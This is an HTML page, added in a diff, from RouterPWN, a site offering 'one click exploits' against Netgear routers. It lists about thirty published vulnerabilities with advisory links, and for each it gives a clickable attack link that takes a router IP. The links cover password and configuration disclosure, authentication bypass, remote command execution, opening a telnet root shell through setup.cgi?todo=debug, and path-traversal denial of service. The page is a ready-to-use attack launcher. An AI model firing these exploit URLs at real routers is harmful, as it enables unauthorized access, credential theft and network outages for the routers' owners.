@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   RouterPWN - Netgear - One click exploits, News, Vulnerabilities, POC, Alerts
+  </title>
+  <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
+  <link href="includes/images/favicon.ico" rel="shortcut icon"/>
+  <script src="../includes/jquery-1.11.1.min.js">
+  </script>
+  <script src="../includes/jquery.dataTables.min.js">
+  </script>
+  <link href="../includes/jquery.dataTables.css" rel="stylesheet"/>
+  <link href="../includes/menu.css" rel="stylesheet"/>
+ </head>
+ <body>
+  <table align="center" cellspacing="0" style="background-image:url(../includes/images/headerbeta.jpg); background-position:center 0px; background-repeat:no-repeat; " width="925">
+   <tbody>
+    <tr>
+     <td>
+      <center>
+       <img src="../includes/images/logo.gif"/>
+      </center>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section class="container">
+       <nav>
+        <ul class="nav">
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+         <li class="active">
+          <a href="/" title="Latest updates by brand">
+           Home
+          </a>
+         </li>
+         <li>
+          <a href="/Generators" title="Online key generators and algorithms">
+           Generators
+          </a>
+         </li>
+         <li>
+          <a href="/Tools" title="Free tools for router hacking">
+           Tools
+          </a>
+         </li>
+         <li>
+          <a href="/Contribute" title="Contribute to Routerpwn.com">
+           Contribute
+          </a>
+         </li>
+         <li>
+          <a href="https://twitter.com/routerpwn" title="Follow Routerpwn updates on Twitter">
+           Follow
+          </a>
+         </li>
+         <li>
+          <a href="/Contact" title="Contact us">
+           Contact
+          </a>
+         </li>
+         <li>
+          <a href="/About" title="About Routerpwn.com">
+           About
+          </a>
+         </li>
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+        </ul>
+       </nav>
+      </section>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section id="netgear">
+       <h1>
+        Netgear
+       </h1>
+       <table cellspacing="0" class="display" id="tabla" width="100%">
+        <thead>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </thead>
+        <tfoot>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </tfoot>
+        <tbody>
+         <form id="netdos" name="netdos">
+         </form>
+         <tr>
+          <td>
+           04/14/14
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/32883/">
+            www.exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:wndr3400_disclosure()">
+            Netgear WNDR3400 - Password Disclosure
+           </a>
+           <a href="javascript:wndr3400_disclosure(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           02/11/14
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/31617/">
+            www.exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dgn2200_commandexec()">
+            Netgear DGN2200 N300 - Remote Command Execution
+           </a>
+           <a href="javascript:dgn2200_commandexec(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           02/11/14
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/31617/">
+            www.exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dgn2200_opentelnet()">
+            Netgear DGN2200 N300 - Get Interactive Telnet Shell (Port 90)
+           </a>
+           <a href="javascript:dgn2200_opentelnet(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           10/22/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://shadow-file.blogspot.com/2013/10/complete-persistent-compromise-of.html">
+            shadow-file.blogspot.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/BRS_02_genieHelp.html">
+            Netgear WNDR3700v4 - Persistent Authentication Bypass
+           </a>
+           <a href="javascript:setip('/BRS_02_genieHelp.html')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           10/22/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://shadow-file.blogspot.com/2013/10/complete-persistent-compromise-of.html">
+            shadow-file.blogspot.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/BRS_success.html">
+            Netgear WNDR3700v4 - Wi-Fi Configuration Disclosure
+           </a>
+           <a href="javascript:setip('/BRS_success.html')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/22/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/27774/">
+            www.exploit-db.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:prosafe_configdisclosure()">
+            Netgear Prosafe - Configuration Disclosure
+           </a>
+           <a href="javascript:prosafe_configdisclosure(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           04/15/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/BRS_success.html">
+            WNDR4700 DLNA server denial of service
+           </a>
+           <a href="javascript:setip('/BRS_success.html')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           04/15/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/BRS_success.html">
+            WNDR4700 Unauthenticated information disclosure
+           </a>
+           <a href="javascript:setip('/BRS_success.html')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           05/05/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/netgear_wndr4700.jsp">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/BRS_03B_haveBackupFile_fileRestore.html">
+            WNDR4700 Authentication bypass
+           </a>
+           <a href="javascript:setip('/BRS_03B_haveBackupFile_fileRestore.html')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           03/02/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.s3cur1ty.de/m1adv2013-002">
+            www.s3cur1ty.de
+           </a>
+          </td>
+          <td>
+           <a href="javascript:sph200d_dirtraversal()">
+            Netgear SPH200D - Directory Traversal
+           </a>
+           <a href="javascript:sph200d_dirtraversal(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           02/06/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.s3cur1ty.de/m1adv2013-005">
+            www.s3cur1ty.de
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dgn1000b_commandexec()">
+            Netgear DGN1000B - Remote Command Execution
+           </a>
+           <a href="javascript:dgn1000b_commandexec(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           12/09/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="https://gist.github.com/4246796">
+            gist.github.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/cgi-bin/WNR2000XT.log">
+            WN2000RPTv2 Admin Password Disclosure
+           </a>
+           <a href="javascript:setip('/cgi-bin/WNR2000XT.log')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           05/28/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://websec.mx/advisories/view/Revelacion_de_informacion_en_Netgear">
+            websec.mx
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/currentsetting.htm">
+            DGND3300v2, WNR2000v2, DGN1000, N300 information disclosure
+           </a>
+           <a href="javascript:setip('/currentsetting.htm')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           04/05/11
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://osvdb.org/show/osvdb/73422">
+            osvdb.org
+           </a>
+          </td>
+          <td>
+           <a href="javascript:netbyp()">
+            WNAP210 authentication bypass
+           </a>
+           <a href="javascript:netbyp()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           07/22/11
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.securityfocus.com/bid/48085/exploit">
+            www.securityfocus.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:setip('/BackupConfig.php')">
+            WNDAP350, WNAP210 BackupConfig.php config disclosure
+           </a>
+           <a href="javascript:setip('/BackupConfig.php')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/14/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://packetstormsecurity.org/files/view/94803/netgearcg3100d-escalate.txt">
+            packetstormsecurity.org
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/__SeContents.html">
+            CG3100D privilege escalation
+           </a>
+           <a href="javascript:setip('/__SeContents.html')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           03/24/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://zitstif.no-ip.org/?p=284">
+            zitstif.no-ip.org
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/vgn/jsp/netgear.cfg')">
+            RP614v4 config disclosure
+           </a>
+           <a href="javascript:netconb()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/24/09
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.enigmagroup.org/exploits/platform/hardware/remote/19162/%22Netgear-WNR2000-FW-1.2.0.8-Information-Disclsoure-Vulnerabilities%22.html">
+            www.enigmagroup.org
+           </a>
+          </td>
+          <td>
+           <a href="javascript:setip('/router-info.htm')">
+            WNR2000 information disclosure
+           </a>
+           <a href="javascript:setip('/router-info.htm')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/24/09
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.enigmagroup.org/exploits/platform/hardware/remote/19162/%22Netgear-WNR2000-FW-1.2.0.8-Information-Disclsoure-Vulnerabilities%22.html">
+            www.enigmagroup.org
+           </a>
+          </td>
+          <td>
+           <a href="javascript:setip('/router-info.htm')">
+            WNR2000 information disclosure
+           </a>
+           <a href="javascript:setip('/router-info.htm')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/20/09
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2009/Aug/280">
+            seclists.org
+           </a>
+          </td>
+          <td>
+           <a href="javascript:setip('/cgi-bin/NETGEAR_WNR2000.cfg')">
+            WNR2000 config disclosure
+           </a>
+           <a href="javascript:setip('/cgi-bin/NETGEAR_WNR2000.cfg')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           06/15/09
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.tomneaves.co.uk/Netgear_DG632_Authentication_Bypass.txt">
+            www.tomneaves.co.uk
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.1/gateway/commands/saveconfig.html">
+            DG632 auth bypass (config disclosure)
+           </a>
+           <a href="javascript:setip('/gateway/commands/saveconfig.html');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           06/15/09
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.tomneaves.co.uk/Netgear_DG632_Authentication_Bypass.txt">
+            www.tomneaves.co.uk
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.1/html/modemmenu.htm">
+            DG632 auth bypass
+           </a>
+           <a href="javascript:setip('/html/modemmenu.htm');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           06/15/09
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.tomneaves.co.uk/Netgear_DG632_Remote_DoS.txt">
+            www.tomneaves.co.uk
+           </a>
+          </td>
+          <td>
+           <a href="javascript:netdos();">
+            DG632 'firmwarecfg' denial of service
+           </a>
+           <a href="javascript:netdos();">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           11/13/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://lists.grok.org.uk/pipermail/full-disclosure/2008-November/065619.html">
+            lists.grok.org.uk
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/?">
+            WGR614v9 denial of service
+           </a>
+           <a href="javascript:setip('/?')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           02/27/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.helith.net/txt/netgear_ssl312_remote_dos.txt">
+            www.helith.net
+           </a>
+          </td>
+          <td>
+           <a href="javascript:setip('/cgi-bin/welcome/VPN_only?../../../../../')">
+            SSL312 VPN denial of service
+           </a>
+           <a href="javascript:setip('/cgi-bin/welcome/VPN_only?../../../../../')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           01/24/05
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityvulns.com/Hdocument664.html">
+            securityvulns.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:netcon()">
+            FVS318 content filtering bypass
+           </a>
+           <a href="javascript:netcon()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           01/24/05
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityvulns.com/Hdocument664.html">
+            securityvulns.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:netlog()">
+            FVS318 log file arbitrary content injection
+           </a>
+           <a href="javascript:netlog()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/12/04
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://archives.neohapsis.com/archives/bugtraq/2004-08/0181.html">
+            archives.neohapsis.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.1/setup.cgi?todo=debug">
+            DG834G enable telnet root shell
+           </a>
+           <a href="javascript:setip('/setup.cgi?todo=debug')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/12/04
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.derkeiler.com/Mailing-Lists/Full-Disclosure/2004-06/0176.html">
+            www.derkeiler.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:netundb()">
+            WG602 undocumented admin account (superman)
+           </a>
+           <a href="javascript:netundb()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/12/04
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://archives.neohapsis.com/archives/fulldisclosure/2004-06/0049.html">
+            archives.neohapsis.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:netund()">
+            WG602 undocumented admin account (super)
+           </a>
+           <a href="javascript:netund()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </section>
+      <script>
+       $(document).ready(function() {
+    $('#tabla').dataTable( {
+        "order": [[ 0, "desc" ]]
+    } );
+} );
+      </script>
+      <script type="text/javascript">
+       var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+      </script>
+      <script type="text/javascript">
+       try {
+var pageTracker = _gat._getTracker("UA-16172640-1");
+pageTracker._trackPageview();
+} catch(err) {}
+      </script>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
